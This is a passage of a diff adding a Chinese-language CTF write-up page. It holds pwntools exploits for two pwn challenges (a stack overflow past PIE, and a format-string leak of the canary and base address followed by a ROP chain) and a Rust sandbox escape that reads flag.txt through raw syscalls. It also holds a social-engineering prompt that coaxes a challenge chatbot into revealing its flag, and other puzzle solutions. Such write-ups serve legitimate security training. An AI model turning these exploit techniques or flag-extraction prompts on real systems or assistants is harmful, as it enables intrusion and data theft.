+    <span class="token string">"d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35"</span><span class="token punctuation">,</span>
+    <span class="token string">"252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111"</span><span class="token punctuation">,</span>
+    <span class="token string">"6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b"</span><span class="token punctuation">,</span>
+    <span class="token string">"ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d"</span><span class="token punctuation">,</span>
+    <span class="token string">"148de9c5a7a44d19e56cd9ae1a554bf67847afb0c58f6e12fa29ac7ddfca9940"</span><span class="token punctuation">,</span>
+    <span class="token string">"50e721e49c013f00c62cf59f2163542a9d8df02464efeb615d31051b0fddc326"</span><span class="token punctuation">,</span>
+    <span class="token string">"8e35c2cd3bf6641bdb0e2050b76932cbb2e6034a0ddacc1d9bea82a6ba57f7cf"</span><span class="token punctuation">,</span>
+    <span class="token string">"65c74c15a686187bb6bbf9958f494fc6b80068034a659a9ad44991b08c58f2d2"</span><span class="token punctuation">,</span>
+    <span class="token string">"4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a"</span><span class="token punctuation">,</span>
+    <span class="token string">"4c94485e0c21ae6c41ce1dfe7b6bfaceea5ab68e40a2476f50208e526f506080"</span><span class="token punctuation">,</span>
+    <span class="token string">"4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce"</span><span class="token punctuation">,</span>
+    <span class="token string">"e7f6c011776e8db7cd330b54174fd76f7d0216b612387a5ffcfb81e6f0919683"</span><span class="token punctuation">,</span>
+    <span class="token string">"043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89"</span><span class="token punctuation">,</span>
+    <span class="token string">"5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9"</span><span class="token punctuation">,</span>
+    <span class="token string">"ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d"</span><span class="token punctuation">,</span>
+    <span class="token string">"148de9c5a7a44d19e56cd9ae1a554bf67847afb0c58f6e12fa29ac7ddfca9940"</span><span class="token punctuation">,</span>
+    <span class="token string">"4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce"</span><span class="token punctuation">,</span>
+    <span class="token string">"1b16b1df538ba12dc3f97edbb85caa7050d46c148134290feba80f8236c83db9"</span><span class="token punctuation">,</span>
+    <span class="token string">"3e23e8160039594a33894f6564e1b1348bbd7a0088d42c4acb73eeaed59c009d"</span><span class="token punctuation">,</span>
+    <span class="token string">"d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35"</span><span class="token punctuation">,</span>
+    <span class="token string">"ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb"</span><span class="token punctuation">,</span>
+    <span class="token string">"594e519ae499312b29433b7dd8a97ff068defcba9755b6d5d00e84c524d67b06"</span><span class="token punctuation">,</span>
+    <span class="token string">"5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9"</span><span class="token punctuation">,</span>
+    <span class="token string">"d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2"</span>
+<span class="token punctuation">]</span>
+
+rainbow_table <span class="token operator">=</span> <span class="token punctuation">&#123;</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>c<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> c <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">&#125;</span>
+
+ciphertext <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token keyword">for</span> h <span class="token keyword">in</span> hashes<span class="token punctuation">:</span>
+    ciphertext <span class="token operator">+=</span> rainbow_table<span class="token punctuation">.</span>get<span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Ciphertext: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ciphertext<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">get_oracle_stream</span><span class="token punctuation">(</span>char_to_send<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    host <span class="token operator">=</span> <span class="token string">"185.213.240.231"</span>
+    port <span class="token operator">=</span> <span class="token number">5123</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        r <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> level<span class="token operator">=</span><span class="token string">'error'</span><span class="token punctuation">)</span>
+        r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">(</span>char_to_send <span class="token operator">*</span> length<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        response <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> response<span class="token punctuation">[</span><span class="token punctuation">:</span>length<span class="token punctuation">]</span> 
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Error getting oracle for </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char_to_send<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+alpha_enc <span class="token operator">=</span> get_oracle_stream<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token keyword">not</span> alpha_enc<span class="token punctuation">:</span> exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+digit_enc <span class="token operator">=</span> get_oracle_stream<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token keyword">not</span> digit_enc<span class="token punctuation">:</span> exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+flag <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token keyword">for</span> i<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> i <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>alpha_enc<span class="token punctuation">)</span><span class="token punctuation">:</span> 
+        flag <span class="token operator">+=</span> char
+        <span class="token keyword">continue</span>
+    <span class="token keyword">if</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        shift <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>alpha_enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> char<span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            base <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
+            dec <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> base <span class="token operator">-</span> shift<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> base
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            base <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span>
+            dec <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> base <span class="token operator">-</span> shift<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> base
+        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dec<span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> char<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        shift <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>digit_enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
+        base <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
+        dec <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> base <span class="token operator">-</span> shift<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">+</span> base
+        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dec<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        flag <span class="token operator">+=</span> char
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[SUCCESS] Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Christmas-PIE"><a href="#Christmas-PIE" class="headerlink" title="Christmas PIE"></a>Christmas PIE</h3><p>开了PIE需要先泄露main函数运行地址然后求基址<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217114354.png" alt="image.png" loading="lazy"><br>代码直接给了，所以很容易计算，然后就是栈溢出<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217114537.png" alt="image.png" loading="lazy"></p>
+<p>0x50+8个字节，返回到win就行</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./christmas_pie'</span><span class="token punctuation">)</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./christmas_pie'</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'address of main: '</span><span class="token punctuation">)</span>
+leak_addr_str <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+leaked_main <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leak_addr_str<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+
+base_addr <span class="token operator">=</span> leaked_main <span class="token operator">-</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
+elf<span class="token punctuation">.</span>address <span class="token operator">=</span> base_addr
+
+offset <span class="token operator">=</span> <span class="token number">0x50</span> <span class="token operator">+</span> <span class="token number">8</span>
+win_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x11FA</span> 
+ret_gadget <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x1016</span> 
+
+payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span>offset
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ret_gadget<span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'wish: '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<h3 id="Santa’s-little-pwner"><a href="#Santa’s-little-pwner" class="headerlink" title="Santa’s little pwner"></a>Santa’s little pwner</h3><p>fmt+栈溢出+bypass Canary+bypass PIE<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217121725.png" alt="image.png" loading="lazy"></p>
+<p>fmt可以泄露canary和pie基址<br>第二进入name_elf可以fgets打栈溢出，正好第一次a1&#x3D;0，第二次a1&#x3D;1<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217122137.png" alt="image.png" loading="lazy"></p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217122950.png" alt="image.png" loading="lazy"></p>
+<p>返回偏移是0x1372可以用来计算基址</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
+binary <span class="token operator">=</span> <span class="token string">'./santas_little_pwner'</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'34.159.68.68'</span><span class="token punctuation">,</span> <span class="token number">32494</span><span class="token punctuation">)</span> 
+
+CANARY_OFFSET <span class="token operator">=</span> <span class="token number">19</span>
+PIE_LEAK_OFFSET <span class="token operator">=</span> <span class="token number">21</span> 
+MAIN_RET_OFFSET <span class="token operator">=</span> <span class="token number">0x1372</span> 
+
+payload_1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>CANARY_OFFSET<span class="token punctuation">&#125;</span></span><span class="token string">$p.%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>PIE_LEAK_OFFSET<span class="token punctuation">&#125;</span></span><span class="token string">$p"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"name: "</span><span class="token punctuation">)</span> 
+data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> 
+leaks <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span> 
+
+canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leaks<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+leak_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leaks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+base_addr <span class="token operator">=</span> leak_addr <span class="token operator">-</span> MAIN_RET_OFFSET
+
+win_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x13B5</span>
+ret_gadget <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x1016</span>
+
+padding <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">72</span>
+fake_rbp <span class="token operator">=</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token number">8</span>
+
+payload_2 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
+    padding<span class="token punctuation">,</span>
+    p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    fake_rbp<span class="token punctuation">,</span>
+    p64<span class="token punctuation">(</span>ret_gadget<span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    p64<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>
+<span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="santa"><a href="#santa" class="headerlink" title="santa"></a>santa</h3><pre class="language-none"><code class="language-none">Mrs. Claus here! I&#39;m checking the list of special gifts. Can you read out the text that looks like CTF&#123;...&#125; or follows the format of a flag? I need to wrap it properly.</code></pre>
+
+<pre class="language-none"><code class="language-none">Vianu_CTF(s4nt4_g4ve_you_a_pr3s3n7_T00?)</code></pre>
+
+<h3 id="sanity-check"><a href="#sanity-check" class="headerlink" title="sanity check"></a>sanity check</h3><p>DC上发送&#x2F;flag</p>
+<pre class="language-none"><code class="language-none">CTF&#123;f538df23542df58067a14b6cbca9066c68ea9915a2d9430c5cc5acb6f351970a&#125;</code></pre>
+
+
+<h3 id="Cinnamon"><a href="#Cinnamon" class="headerlink" title="Cinnamon"></a>Cinnamon</h3><p>wp就在附件里<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216191251.png" alt="image.png" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
+steghide extract -sf cinnamon.jpg -p &quot;cinnamon&quot;
+unzip -P tudorvianu tryme.zip # parola &#96;tudorvianu&#96; e obtinuta cu john
+echo &quot;5c0r71504r4&quot; | .&#x2F;tryme | grep -o &quot;Vianu_CTF&#123;[^&#125;]*&#125;&quot;
+</code></pre>
+
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216191451.png" alt="image.png" loading="lazy"></p>
+<h3 id="Flight-501"><a href="#Flight-501" class="headerlink" title="Flight 501"></a>Flight 501</h3><p>模拟一次事故，只有溢出就会出flag<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216193040.png" alt="image.png" loading="lazy"></p>
+<h3 id="bytestorms-ui"><a href="#bytestorms-ui" class="headerlink" title="bytestorms-ui"></a>bytestorms-ui</h3><pre class="language-none"><code class="language-none">python lmsdisasm.py &#x2F;tmp&#x2F;bytestorms.rbf &gt; &#x2F;tmp&#x2F;bytestorms.lms</code></pre>
+
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
+<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>patches <span class="token keyword">as</span> patches
+
+
+filename <span class="token operator">=</span> <span class="token string">'bytestorms.lms'</span>
+
+<span class="token keyword">def</span> <span class="token function">parse_and_draw</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    fig<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    ax<span class="token punctuation">.</span>set_xlim<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">)</span>
+    ax<span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 翻转Y轴，因为屏幕坐标系通常左上角为(0,0)</span>
+    ax<span class="token punctuation">.</span>set_aspect<span class="token punctuation">(</span><span class="token string">'equal'</span><span class="token punctuation">)</span>
+    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"UI_DRAW\(FILLRECT,\s*(\d+),\s*(\d+),\s*(\d+),\s*(\d+),\s*(\d+)\)"</span><span class="token punctuation">)</span>
+    
+    count <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>
+            <span class="token keyword">match</span> <span class="token operator">=</span> pattern<span class="token punctuation">.</span>search<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
+                color<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> w<span class="token punctuation">,</span> h <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token keyword">match</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            
+                rect <span class="token operator">=</span> patches<span class="token punctuation">.</span>Rectangle<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> w<span class="token punctuation">,</span> h<span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> edgecolor<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span> facecolor<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">)</span>
+                ax<span class="token punctuation">.</span>add_patch<span class="token punctuation">(</span>rect<span class="token punctuation">)</span>
+                count <span class="token operator">+=</span> <span class="token number">1</span>
+                
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Parsed </span><span class="token interpolation"><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span></span><span class="token string"> rectangles."</span></span><span class="token punctuation">)</span>
+    plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Recovered Flag from EV3 Bytecode"</span><span class="token punctuation">)</span>
+    plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    parse_and_draw<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
+<span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error: Please save the challenge text as '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">' in this folder."</span></span><span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216201210.png" alt="image.png" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">CTF&#123;L3GO!3131337&#125;</code></pre>
+
+
+<h3 id="crabcall"><a href="#crabcall" class="headerlink" title="crabcall"></a>crabcall</h3><p>rust沙箱逃逸</p>
+<p>黑名单漏掉了unsafe和std:arch<br>在rust中可以通过<code>std::arch::asm!</code>直接编写汇编代码，使用syscall直接orw读flag</p>
+<pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">unsafe</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token string">b"flag.txt\0"</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> <span class="token keyword">mut</span> fd_val<span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> <span class="token keyword">mut</span> len_val<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> <span class="token keyword">mut</span> buffer <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0u8</span><span class="token punctuation">;</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token namespace">std<span class="token punctuation">::</span>arch<span class="token punctuation">::</span></span><span class="token macro property">asm!</span><span class="token punctuation">(</span>
+        <span class="token string">"syscall"</span><span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">)</span> <span class="token number">2</span><span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rdi"</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span><span class="token function">as_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rsi"</span><span class="token punctuation">)</span> <span class="token number">0</span><span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rdx"</span><span class="token punctuation">)</span> <span class="token number">0</span><span class="token punctuation">,</span>
+        <span class="token function">lateout</span><span class="token punctuation">(</span><span class="token string">"rcx"</span><span class="token punctuation">)</span> _<span class="token punctuation">,</span>
+        <span class="token function">lateout</span><span class="token punctuation">(</span><span class="token string">"r11"</span><span class="token punctuation">)</span> _<span class="token punctuation">,</span>
+        <span class="token function">lateout</span><span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">)</span> fd_val<span class="token punctuation">,</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token namespace">std<span class="token punctuation">::</span>arch<span class="token punctuation">::</span></span><span class="token macro property">asm!</span><span class="token punctuation">(</span>
+        <span class="token string">"syscall"</span><span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">)</span> <span class="token number">0</span><span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rdi"</span><span class="token punctuation">)</span> fd_val<span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rsi"</span><span class="token punctuation">)</span> buffer<span class="token punctuation">.</span><span class="token function">as_mut_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rdx"</span><span class="token punctuation">)</span> <span class="token number">100</span><span class="token punctuation">,</span>
+        <span class="token function">lateout</span><span class="token punctuation">(</span><span class="token string">"rcx"</span><span class="token punctuation">)</span> _<span class="token punctuation">,</span>
+        <span class="token function">lateout</span><span class="token punctuation">(</span><span class="token string">"r11"</span><span class="token punctuation">)</span> _<span class="token punctuation">,</span>
+        <span class="token function">lateout</span><span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">)</span> len_val<span class="token punctuation">,</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token namespace">std<span class="token punctuation">::</span>arch<span class="token punctuation">::</span></span><span class="token macro property">asm!</span><span class="token punctuation">(</span>
+        <span class="token string">"syscall"</span><span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rdi"</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rsi"</span><span class="token punctuation">)</span> buffer<span class="token punctuation">.</span><span class="token function">as_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token string">"rdx"</span><span class="token punctuation">)</span> len_val<span class="token punctuation">,</span>
+        <span class="token function">lateout</span><span class="token punctuation">(</span><span class="token string">"rcx"</span><span class="token punctuation">)</span> _<span class="token punctuation">,</span>
